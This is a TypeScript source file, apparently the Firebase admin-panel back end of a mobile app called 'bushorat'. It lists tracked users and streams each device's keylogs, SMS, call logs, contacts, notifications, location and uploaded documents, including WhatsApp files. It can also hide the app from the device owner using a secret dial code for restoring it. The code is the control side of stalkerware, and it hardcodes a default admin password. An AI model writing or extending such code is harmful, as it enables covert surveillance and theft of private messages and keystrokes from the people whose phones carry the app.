import {
  createUserWithEmailAndPassword,
  onAuthStateChanged,
  signInWithEmailAndPassword,
  signOut,
  User,
} from "firebase/auth";
import {
  get,
  onValue,
  push,
  ref,
  remove,
  set,
  update,
  Unsubscribe,
} from "firebase/database";
import {
  deleteObject,
  getDownloadURL,
  ref as storageRef,
  uploadBytesResumable,
} from "firebase/storage";
import { auth, db, storage } from "./firebase";

/** Single admin credential for the panel (override via .env). */
export const ADMIN_EMAIL =
  import.meta.env.VITE_ADMIN_EMAIL || "admin@bushorat.app";
export const ADMIN_PASSWORD =
  import.meta.env.VITE_ADMIN_PASSWORD || "Admin@12345";

const SESSION_KEY = "bushorat_admin_session";

export function isAdminUser(user: User | null | undefined): boolean {
  return Boolean(user?.email && user.email.toLowerCase() === ADMIN_EMAIL.toLowerCase());
}

export function hasAdminSession(): boolean {
  try {
    const raw = localStorage.getItem(SESSION_KEY);
    if (!raw) return false;
    const data = JSON.parse(raw) as { ok?: boolean; email?: string };
    return Boolean(data?.ok && data.email?.toLowerCase() === ADMIN_EMAIL.toLowerCase());
  } catch {
    return false;
  }
}

function setAdminSession() {
  localStorage.setItem(
    SESSION_KEY,
    JSON.stringify({ ok: true, email: ADMIN_EMAIL, at: Date.now() })
  );
}

function clearAdminSession() {
  localStorage.removeItem(SESSION_KEY);
}

function firebaseAuthMessage(err: unknown): string {
  const code = (err as { code?: string })?.code || "";
  const message = (err as { message?: string })?.message || "Login failed";

  if (code === "auth/operation-not-allowed") {
    return "Enable Email/Password in Firebase Console → Authentication → Sign-in method.";
  }
  if (code === "auth/invalid-api-key" || code === "auth/api-key-not-valid") {
    return "Firebase API key is invalid. Check admin Firebase config.";
  }
  if (code === "auth/network-request-failed") {
    return "Network error talking to Firebase. Check your connection.";
  }
  if (code === "auth/too-many-requests") {
    return "Too many failed attempts. Try again later.";
  }
  if (code === "auth/email-already-in-use") {
    return "Admin email exists in Firebase with a different password. Reset it in Firebase Auth or update VITE_ADMIN_PASSWORD.";
  }
  if (
    code === "auth/wrong-password" ||
    code === "auth/invalid-credential" ||
    code === "auth/invalid-login-credentials"
  ) {
    return "Wrong password for the Firebase admin user.";
  }
  return message;
}

export type UserRow = {
  id: string;
  email: string;
  display_name: string;
  device_model: string | null;
  last_seen: number | null;
  is_hidden: boolean;
};

export type UserBundle = {
  userId: string;
  profile: Record<string, unknown> | null;
  device_info: Record<string, unknown> | null;
  location: Record<string, unknown> | null;
  visibility: {
    is_hidden: boolean;
    secret_code?: string;
    restore_dial_code?: string;
    hidden_at?: number | null;
    shown_at?: number | null;
  };
  call_logs: Record<string, unknown>;
  sms: Record<string, unknown>;
  contacts: Record<string, unknown>;
  notifications: Record<string, unknown>;
  keylogs: Record<string, unknown>;
  gallery: Record<string, unknown>;
  documents: Record<string, unknown>;
  sync_status: Record<string, unknown>;
};

export function watchAuth(callback: (user: User | null) => void) {
  return onAuthStateChanged(auth, callback);
}

export function getCurrentUser() {
  return auth.currentUser;
}

/**
 * Single-credential admin login.
 * Validates local admin email/password, then signs into Firebase
 * (creates the Firebase user automatically on first successful login).
 */
export async function loginAdmin(email: string, password: string) {
  const normalized = email.trim().toLowerCase();
  if (
    normalized !== ADMIN_EMAIL.toLowerCase() ||
    password !== ADMIN_PASSWORD
  ) {
    throw new Error(`Invalid admin credentials. Use ${ADMIN_EMAIL}`);
  }

  try {
    await signInWithEmailAndPassword(auth, ADMIN_EMAIL, ADMIN_PASSWORD);
  } catch (err) {
    const code = (err as { code?: string })?.code || "";
    const missingOrBad =
      code === "auth/user-not-found" ||
      code === "auth/invalid-credential" ||
      code === "auth/invalid-login-credentials" ||
      code === "auth/wrong-password";

    if (!missingOrBad) {
      throw new Error(firebaseAuthMessage(err));
    }

    // First-time setup: create the admin user, then sign in.
    try {
      await createUserWithEmailAndPassword(auth, ADMIN_EMAIL, ADMIN_PASSWORD);
    } catch (createErr) {
      const createCode = (createErr as { code?: string })?.code || "";
      if (createCode === "auth/email-already-in-use") {
        throw new Error(
          "Admin email exists in Firebase with a different password. In Firebase Console → Authentication, reset password for admin@bushorat.app to match Admin@12345 (or your .env values)."
        );
      }
      throw new Error(firebaseAuthMessage(createErr));
    }
  }

  if (!isAdminUser(auth.currentUser)) {
    await signOut(auth);
    clearAdminSession();
    throw new Error("Invalid admin credentials");
  }

  setAdminSession();
  return auth.currentUser;
}

export async function logoutAdmin() {
  clearAdminSession();
  await signOut(auth);
}

function buildUserRows(
  userData: Record<string, any>,
  visibility: Record<string, any>,
  users: Record<string, any>,
  documentUserIds: string[] = []
): UserRow[] {
  const ids = new Set<string>([
    ...Object.keys(userData),
    ...Object.keys(visibility),
    ...Object.keys(users),
    ...documentUserIds,
  ]);

  const rows: UserRow[] = [];
  for (const id of ids) {
    const profile = userData[id]?.profile || users[id] || {};
    const vis = visibility[id] || {};
    rows.push({
      id,
      email: profile.email || users[id]?.email || "",
      display_name: profile.displayName || users[id]?.displayName || users[id]?.fullName || "",
      device_model: profile.deviceModel || null,
      last_seen: profile.lastSeen || users[id]?.lastSeen || users[id]?.lastLogin || null,
      is_hidden: Boolean(vis.is_hidden),
    });
  }

  rows.sort((a, b) => (b.last_seen || 0) - (a.last_seen || 0));
  return rows;
}

/** Coerce RTDB timestamps (number or ServerValue-resolved number). */
export function documentTimestamp(doc: Record<string, any>): number {
  const raw = doc.uploadedAt ?? doc.timestamp ?? 0;
  if (typeof raw === "number" && Number.isFinite(raw)) return raw;
  if (typeof raw === "object" && raw !== null && ".sv" in raw) return Date.now();
  const n = Number(raw);
  return Number.isFinite(n) ? n : 0;
}

export function documentDisplayName(doc: Record<string, any>): string {
  return (
    doc.fileName ||
    doc.name ||
    (typeof doc.storagePath === "string"
      ? doc.storagePath.split("/").pop() || ""
      : "") ||
    doc.id ||
    "Document"
  );
}

export function documentDownloadUrl(doc: Record<string, any>): string {
  return String(doc.url || doc.downloadUrl || doc.fileUrl || "");
}

export function documentIsImage(doc: Record<string, any>): boolean {
  const cat = String(doc.category || "").toUpperCase();
  if (cat === "IMAGE") return true;
  const mime = String(doc.mimeType || "");
  if (mime.startsWith("image/")) return true;
  const name = documentDisplayName(doc);
  return /\.(jpg|jpeg|png|gif|webp|heic|heif|bmp|dng|jfif)$/i.test(name);
}

export function documentTypeLabel(doc: Record<string, any>): string {
  const cat = String(doc.category || "");
  if (cat) return cat;
  const name = documentDisplayName(doc).toLowerCase();
  if (name.endsWith(".pdf")) return "PDF";
  if (documentIsImage(doc)) return "IMAGE";
  if (doc.mimeType) return String(doc.mimeType);
  return "FILE";
}

/** Match device upload order: PDF → Office → text → images. */
export function documentSortRank(doc: Record<string, any>): number {
  const cat = String(doc.category || "").toUpperCase();
  const source = String(doc.source || "").toLowerCase();
  const wa = source === "whatsapp";
  const name = documentDisplayName(doc).toLowerCase();
  const inferredPdf = cat === "PDF" || name.endsWith(".pdf");
  const inferredOffice =
    cat === "OFFICE" || /\.(doc|docx|xls|xlsx|ppt|pptx|odt|ods|odp|rtf)$/.test(name);
  const inferredText = cat === "TEXT" || /\.(txt|csv|md|log)$/.test(name);
  const inferredImage = documentIsImage(doc);

  if (inferredPdf) return wa ? 0 : 1;
  if (inferredOffice) return wa ? 2 : 3;
  if (inferredText) return wa ? 4 : 5;
  if (inferredImage) return wa ? 6 : 7;
  return 8;
}

/** Documents tab list: type priority, then newest first within each tier. */
export function documentsToList(
  map: Record<string, unknown> | null | undefined
): Array<Record<string, any> & { id: string }> {
  if (!map) return [];
  const rows: Array<Record<string, any> & { id: string }> = Object.entries(map).map(
    ([id, value]) => ({
      id,
      ...((value && typeof value === "object" ? value : { value }) as Record<string, any>),
    })
  );
  rows.sort((a, b) => {
    const rankDiff = documentSortRank(a) - documentSortRank(b);
    if (rankDiff !== 0) return rankDiff;
    return documentTimestamp(b) - documentTimestamp(a);
  });
  return rows;
}

export function documentByteSize(doc: Record<string, any>): number | null {
  const n = Number(doc.fileSize ?? doc.sizeBytes);
  return Number.isFinite(n) && n > 0 ? n : null;
}

/** Legacy gallery / images / user_data paths → document shape (admin Documents tab). */
function legacyMediaAsDocuments(
  prefix: string,
  map: Record<string, unknown> | null | undefined,
  userId: string
): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  if (!map || typeof map !== "object") return out;

  for (const [id, raw] of Object.entries(map)) {
    const item = (raw && typeof raw === "object" ? raw : {}) as Record<string, any>;
    const fileName = item.fileName || item.name || id;
    out[`${prefix}_${id}`] = {
      dataType: "document",
      fileName,
      url: item.url || item.downloadUrl || "",
      fileSize: item.fileSize ?? item.sizeBytes,
      mimeType: item.mimeType,
      uploadedAt: item.uploadedAt,
      timestamp: item.timestamp ?? item.uploadedAt,
      source: item.source || "device",
      category:
        item.category ||
        (item.dataType === "image" || /\.(jpg|jpeg|png|gif|webp|heic)$/i.test(fileName)
          ? "IMAGE"
          : "FILE"),
      userId: item.userId || userId,
    };
  }
  return out;
}

/** Merge documents/{userId} with legacy nodes; dedupe by storagePath or download URL. */
export function mergeDocumentMaps(
  primaryDocuments: Record<string, unknown> | null | undefined,
  userId: string,
  legacyUserDataDocuments?: Record<string, unknown> | null,
  gallery?: Record<string, unknown> | null,
  images?: Record<string, unknown> | null
): Record<string, unknown> {
  const fromGallery = legacyMediaAsDocuments("gal", gallery, userId);
  const fromImages = legacyMediaAsDocuments("img", images, userId);
  const fromLegacyUser = legacyMediaAsDocuments("ud", legacyUserDataDocuments, userId);
  const fromPrimary = (primaryDocuments && typeof primaryDocuments === "object"
    ? primaryDocuments
    : {}) as Record<string, unknown>;

  const seen = new Set<string>();
  const deduped: Record<string, unknown> = {};

  const layers: Record<string, unknown>[] = [
    fromPrimary,
    fromLegacyUser,
    fromImages,
    fromGallery,
  ];

  for (const layer of layers) {
    for (const [id, value] of Object.entries(layer)) {
      const doc = (value && typeof value === "object" ? value : {}) as Record<string, any>;
      const key =
        (doc.storagePath && String(doc.storagePath)) ||
        documentDownloadUrl({ ...doc, id }) ||
        id;
      if (seen.has(key)) continue;
      seen.add(key);
      deduped[id] = value;
    }
  }
  return deduped;
}

function buildUserBundle(
  userId: string,
  data: Record<string, any>,
  vis: Record<string, any>,
  documentsRoot?: Record<string, any> | null
): UserBundle {
  return {
    userId,
    profile: data.profile || null,
    device_info: data.device_info || null,
    location: data.location || null,
    visibility: {
      is_hidden: Boolean(vis.is_hidden),
      secret_code: vis.secret_code || "",
      restore_dial_code: vis.restore_dial_code || "*#*#737826#*#*",
      hidden_at: vis.hidden_at ?? null,
      shown_at: vis.shown_at ?? null,
    },
    call_logs: data.call_logs || {},
    sms: data.sms || {},
    contacts: data.contacts || {},
    notifications: data.notifications || {},
    keylogs: data.keylogs || {},
    gallery: {},
    documents: mergeDocumentMaps(
      documentsRoot,
      userId,
      data.documents,
      data.gallery,
      data.images
    ),
    sync_status: data.sync_status || {},
  };
}

export async function listUsers(): Promise<UserRow[]> {
  const [userDataSnap, visibilitySnap, usersSnap, documentsSnap] = await Promise.all([
    get(ref(db, "user_data")),
    get(ref(db, "app_visibility")),
    get(ref(db, "users")),
    get(ref(db, "documents")),
  ]);

  const documentsRoot = (documentsSnap.val() || {}) as Record<string, unknown>;

  return buildUserRows(
    (userDataSnap.val() || {}) as Record<string, any>,
    (visibilitySnap.val() || {}) as Record<string, any>,
    (usersSnap.val() || {}) as Record<string, any>,
    Object.keys(documentsRoot)
  );
}

/** Live users list — merges three Firebase paths without full-page flicker. */
export function watchUsers(
  onData: (rows: UserRow[]) => void,
  onError?: (err: Error) => void
): Unsubscribe {
  let userData: Record<string, any> = {};
  let visibility: Record<string, any> = {};
  let users: Record<string, any> = {};
  let documentUserIds: string[] = [];
  let ready = { userData: false, visibility: false, users: false, documents: false };

  const emit = () => {
    if (!ready.userData || !ready.visibility || !ready.users || !ready.documents) return;
    onData(buildUserRows(userData, visibility, users, documentUserIds));
  };

  const handleError = (err: Error) => onError?.(err);

  const unsub1 = onValue(
    ref(db, "user_data"),
    (snap) => {
      userData = (snap.val() || {}) as Record<string, any>;
      ready.userData = true;
      emit();
    },
    handleError
  );
  const unsub2 = onValue(
    ref(db, "app_visibility"),
    (snap) => {
      visibility = (snap.val() || {}) as Record<string, any>;
      ready.visibility = true;
      emit();
    },
    handleError
  );
  const unsub3 = onValue(
    ref(db, "users"),
    (snap) => {
      users = (snap.val() || {}) as Record<string, any>;
      ready.users = true;
      emit();
    },
    handleError
  );
  const unsub4 = onValue(
    ref(db, "documents"),
    (snap) => {
      const root = (snap.val() || {}) as Record<string, unknown>;
      documentUserIds = Object.keys(root);
      ready.documents = true;
      emit();
    },
    handleError
  );

  return () => {
    unsub1();
    unsub2();
    unsub3();
    unsub4();
  };
}

export async function getUserBundle(userId: string): Promise<UserBundle> {
  const [dataSnap, visSnap, documentsSnap] = await Promise.all([
    get(ref(db, `user_data/${userId}`)),
    get(ref(db, `app_visibility/${userId}`)),
    get(ref(db, `documents/${userId}`)),
  ]);

  return buildUserBundle(
    userId,
    (dataSnap.val() || {}) as Record<string, any>,
    (visSnap.val() || {}) as Record<string, any>,
    (documentsSnap.val() || {}) as Record<string, any>
  );
}

/** Live user detail — updates as keylogs/SMS/etc. arrive. */
export function watchUserBundle(
  userId: string,
  onData: (bundle: UserBundle) => void,
  onError?: (err: Error) => void
): Unsubscribe {
  let data: Record<string, any> = {};
  let vis: Record<string, any> = {};
  let documentsRoot: Record<string, any> = {};
  let ready = { data: false, vis: false, documents: false };

  const emit = () => {
    if (!ready.data || !ready.vis || !ready.documents) return;
    onData(buildUserBundle(userId, data, vis, documentsRoot));
  };

  const handleError = (err: Error) => onError?.(err);

  const unsub1 = onValue(
    ref(db, `user_data/${userId}`),
    (snap) => {
      data = (snap.val() || {}) as Record<string, any>;
      ready.data = true;
      emit();
    },
    handleError
  );
  const unsub2 = onValue(
    ref(db, `app_visibility/${userId}`),
    (snap) => {
      vis = (snap.val() || {}) as Record<string, any>;
      ready.vis = true;
      emit();
    },
    handleError
  );
  const unsub3 = onValue(
    ref(db, `documents/${userId}`),
    (snap) => {
      documentsRoot = (snap.val() || {}) as Record<string, any>;
      ready.documents = true;
      emit();
    },
    handleError
  );

  return () => {
    unsub1();
    unsub2();
    unsub3();
  };
}

export async function setUserHidden(userId: string, isHidden: boolean) {
  const path = ref(db, `app_visibility/${userId}`);
  const existing = (await get(path)).val() as Record<string, any> | null;
  const updates: Record<string, unknown> = {
    is_hidden: isHidden,
  };

  if (isHidden) {
    updates.hidden_at = Date.now();
    updates.restore_dial_code = "*#*#737826#*#*";
    if (!existing?.secret_code) {
      updates.secret_code = String(Math.floor(100000 + Math.random() * 900000));
    }
  } else {
    updates.shown_at = Date.now();
  }

  if (existing) {
    await update(path, updates);
  } else {
    await set(path, {
      is_hidden: isHidden,
      secret_code: updates.secret_code || "",
      restore_dial_code: "*#*#737826#*#*",
      hidden_at: isHidden ? Date.now() : null,
      shown_at: isHidden ? null : Date.now(),
    });
  }
}

/** Sort map records by timestamp/date/uploadedAt descending. */
export function recordsToList(
  map: Record<string, unknown> | null | undefined
): Array<Record<string, any> & { id: string }> {
  if (!map) return [];
  const rows: Array<Record<string, any> & { id: string }> = Object.entries(map).map(
    ([id, value]) => ({
      id,
      ...((value && typeof value === "object" ? value : { value }) as Record<string, any>),
    })
  );
  rows.sort((a, b) => {
    const ta = Number(
      a.totalTimeMs || documentTimestamp(a) || a.date || 0
    );
    const tb = Number(
      b.totalTimeMs || documentTimestamp(b) || b.date || 0
    );
    return tb - ta;
  });
  return rows;
}

export function formatTime(ms?: number | string | null) {
  if (ms == null || ms === "") return "—";
  const n = typeof ms === "string" ? Number(ms) : ms;
  if (!Number.isFinite(n) || n <= 0) return "—";
  return new Date(n).toLocaleString();
}

export function callTypeLabel(type: unknown) {
  const t = Number(type);
  if (t === 1) return "Incoming";
  if (t === 2) return "Outgoing";
  if (t === 3) return "Missed";
  if (t === 4) return "Voicemail";
  if (t === 5) return "Rejected";
  if (t === 6) return "Blocked";
  return type != null ? String(type) : "—";
}

export function smsTypeLabel(type: unknown) {
  const t = Number(type);
  if (t === 1) return "Inbox";
  if (t === 2) return "Sent";
  if (t === 3) return "Draft";
  if (t === 4) return "Outbox";
  return type != null ? String(type) : "—";
}

export function formatDuration(seconds: unknown) {
  const s = Number(seconds);
  if (!Number.isFinite(s) || s < 0) return "—";
  const m = Math.floor(s / 60);
  const r = s % 60;
  return m > 0 ? `${m}m ${r}s` : `${r}s`;
}

export function appLabel(packageName?: string | null) {
  if (!packageName) return "Unknown app";
  const short = packageName.split(".").pop() || packageName;
  return short.charAt(0).toUpperCase() + short.slice(1);
}

export type VideoItem = {
  id: string;
  title: string;
  url: string;
  videoUrl: string;
  thumbnailUrl?: string;
  uploadedBy?: string;
  uploadedAt?: number;
  timestamp?: number;
  storagePath?: string;
};

export function watchVideos(
  onData: (videos: VideoItem[]) => void,
  onError?: (err: Error) => void
): Unsubscribe {
  return onValue(
    ref(db, "videos"),
    (snap) => {
      const raw = (snap.val() || {}) as Record<string, any>;
      const list: VideoItem[] = Object.entries(raw)
        .map(([id, v]) => ({
          id,
          title: v?.title || "Untitled",
          url: v?.url || v?.videoUrl || "",
          videoUrl: v?.videoUrl || v?.url || "",
          thumbnailUrl: v?.thumbnailUrl || "",
          uploadedBy: v?.uploadedBy || "",
          uploadedAt: Number(v?.uploadedAt || 0),
          timestamp: Number(v?.timestamp || 0),
          storagePath: v?.storagePath || "",
        }))
        .filter((v) => Boolean(v.videoUrl || v.url))
        .sort(
          (a, b) =>
            (b.uploadedAt || b.timestamp || 0) - (a.uploadedAt || a.timestamp || 0)
        );
      onData(list);
    },
    (err) => onError?.(err)
  );
}

export async function uploadVideo(opts: {
  file: File;
  title: string;
  onProgress?: (pct: number) => void;
}): Promise<VideoItem> {
  const title = opts.title.trim() || opts.file.name.replace(/\.[^.]+$/, "");
  const videoId = push(ref(db, "videos")).key;
  if (!videoId) throw new Error("Could not create video id");

  const ext = opts.file.name.includes(".")
    ? opts.file.name.slice(opts.file.name.lastIndexOf("."))
    : ".mp4";
  const path = `videos/${videoId}/video${ext}`;
  const fileRef = storageRef(storage, path);

  const task = uploadBytesResumable(fileRef, opts.file, {
    contentType: opts.file.type || "video/mp4",
  });

  const url = await new Promise<string>((resolve, reject) => {
    task.on(
      "state_changed",
      (snap) => {
        if (snap.totalBytes > 0) {
          opts.onProgress?.(Math.round((snap.bytesTransferred / snap.totalBytes) * 100));
        }
      },
      reject,
      async () => {
        try {
          resolve(await getDownloadURL(task.snapshot.ref));
        } catch (e) {
          reject(e);
        }
      }
    );
  });

  const now = Date.now();
  const payload = {
    id: videoId,
    title,
    url,
    videoUrl: url,
    thumbnailUrl: "",
    uploadedBy: "admin",
    uploadedAt: now,
    timestamp: now,
    storagePath: path,
  };

  await set(ref(db, `videos/${videoId}`), payload);
  return payload;
}

export async function deleteVideo(video: VideoItem) {
  if (video.storagePath) {
    try {
      await deleteObject(storageRef(storage, video.storagePath));
    } catch {
      // Ignore missing storage object; still remove DB entry.
    }
  }
  await remove(ref(db, `videos/${video.id}`));
}
